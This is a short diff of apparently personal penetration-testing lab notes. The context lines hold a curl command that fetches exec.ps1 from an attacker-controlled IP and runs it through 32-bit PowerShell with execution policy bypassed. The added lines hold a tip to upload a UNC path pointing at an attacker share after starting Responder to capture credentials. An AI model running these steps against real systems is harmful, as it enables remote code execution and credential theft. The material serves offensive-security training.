@@ -71,3 +71,9 @@ since the script is in 32 bit, faced problem in executing because powershell cmd
 curl http://192.168.1.11:9090/exec.ps1 -o exec.ps1
 %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -exec bypass .\exec.ps1
 ![[exec.ps1]]
+
+### 15.3.3
+
+same as given in walkthrough
+use unc path for file upload after setting up responder
+//192.168.45.230/share/ack1.php
